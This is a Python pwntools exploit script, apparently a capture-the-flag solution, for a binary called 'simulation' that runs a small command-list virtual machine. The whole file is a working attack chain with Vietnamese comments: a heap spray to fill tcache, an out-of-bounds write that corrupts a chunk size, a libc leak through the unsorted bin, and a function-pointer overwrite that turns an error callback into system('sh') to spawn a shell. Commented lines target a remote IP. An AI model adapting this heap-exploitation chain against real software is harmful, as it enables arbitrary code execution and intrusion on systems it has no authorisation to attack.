#!/usr/bin/env python3

from pwn import *



def arg_re(idx):
    return p64(1) + p64(idx)

def arg_c(val):
    return p64(0) + p64(val)

def arg_mem(off):
    return p64(2) + p64(off)

def add():
    return p64(0)

def subtract():
    return p64(1)

def multiply():
    return p64(2)

def divide():
    return p64(3)

def store():
    return p64(4)

def load():
    return p64(5)

def add_cmd(arg1, arg2, arg3):
    return add() + arg1 + arg2 + arg3

def subtract_cmd(arg1, arg2, arg3):
    return subtract() + arg1 + arg2 + arg3

def multiply_cmd(arg1, arg2, arg3):
    return multiply() + arg1 + arg2 + arg3

def divide_cmd(arg1, arg2, arg3):
    return divide() + arg1 + arg2 + arg3

def store_cmd(arg1, arg2):
    return store() + arg1 + arg2 + arg_c(0)

def load_cmd(arg1, arg2):
    return load() + arg1 + arg2 + arg_c(0)

def new_node(idx, nb, next, cmd, default, handler):
    r.sendlineafter("> ", b'1')
    r.sendlineafter("Index: ", str(idx).encode())
    r.sendlineafter("command: ", str(nb).encode())
    r.sendlineafter("node: ", str(next).encode())
    r.sendafter("list: ", cmd)
    if default:
        r.sendlineafter("y/n): ", b'y')
    else:
        r.sendlineafter("y/n): ", b'n')
    r.sendlineafter("handler", str(handler).encode())

def run(start):
    r.sendlineafter("> ", b'2')
    r.sendlineafter("start? ", str(start).encode())

r=process('./simulation')
#r = remote("103.163.25.143", 20007)
#r = remote("localhost", 2007)
new_node(1, 1, 0, load_cmd(arg_mem(0x1000), arg_re(0)), True, 1)
new_node(2, 1, 0, load_cmd(arg_mem(0x1000), arg_re(0)), True, 1)
new_node(3, 1, 0, load_cmd(arg_mem(0x1000), arg_re(0)), True, 1)
new_node(4, 1, 0, load_cmd(arg_mem(0x1000), arg_re(0)), True, 1)
new_node(5, 1, 0, load_cmd(arg_mem(0x1000), arg_re(0)), True, 1)
new_node(6, 1, 0, load_cmd(arg_mem(0x1000), arg_re(0)), True, 1)
new_node(7, 1, 0, load_cmd(arg_mem(0x1000), arg_re(0)), True, 1)
new_node(8, 1, 0, load_cmd(arg_mem(0x1000), arg_re(0)), True, 1)
new_node(9, 1, 0, load_cmd(arg_mem(0x1000), arg_re(0)), True, 1)
run(1)

# Step 1: Spray nhiều node để khi free sẽ fill tcache và tràn sang fast bin
# như vậy command mới khi được calloc sẽ trả về từ fast bin
#input()
trigger_err = store_cmd(arg_mem(0x50), arg_c(2))
trigger_err += add_cmd(arg_c(0), arg_c(2), arg_re(0))
trigger_err += subtract_cmd(arg_re(0), arg_mem(0x50), arg_re(1))
trigger_err += divide_cmd(arg_c(2), arg_re(1), arg_c(0))

pwn = store_cmd(arg_mem(0x60 - 8), arg_c(0x160 + 0x370*2 + 1))
new_node(1, 4, 0, trigger_err, False, 2)
new_node(2, 1, 0, pwn, False, 0)
new_node(3, 0xf, 0, load_cmd(arg_mem(0x1000), arg_re(0))*0xf, True, 1)
new_node(4, 0xf, 0, load_cmd(arg_mem(0x1000), arg_re(0))*0xf, True, 1)
new_node(5, 0xf, 0, load_cmd(arg_mem(0x1000), arg_re(0))*0xf, True, 1)
run(1)
#input()
# Step 2: Sử dụng out of bounds write để thay đổi size của một node
# như vậy khi cleanup và free node sẽ đưa chunk vào unsorted bin 
# nhờ đó ta có thể leak được libc trên heap

pwn = load_cmd(arg_mem(0x2a0), arg_re(0))
pwn += subtract_cmd(arg_re(0), arg_c(0x1c8f80), arg_re(1))
pwn += store_cmd(arg_mem(0x160), arg_c(0x200006873))
pwn += store_cmd(arg_mem(0x170), arg_re(1))
pwn += divide_cmd(arg_c(0),arg_c(0),arg_c(0))
new_node(1, 4, 0, trigger_err, False, 2)
new_node(2, 5, 0, pwn, False, 0)
input()
run(1)

# Step 3: Với libc address trên heap giờ sử dụng OOB read write
# và relative add hay subtract để ghi đè function pointer
# và ghi đè string sh vào đầu struct node
# như vậy khi gọi error_callback(struct * node,...) sẽ thành system("sh;..",...)
r.interactive()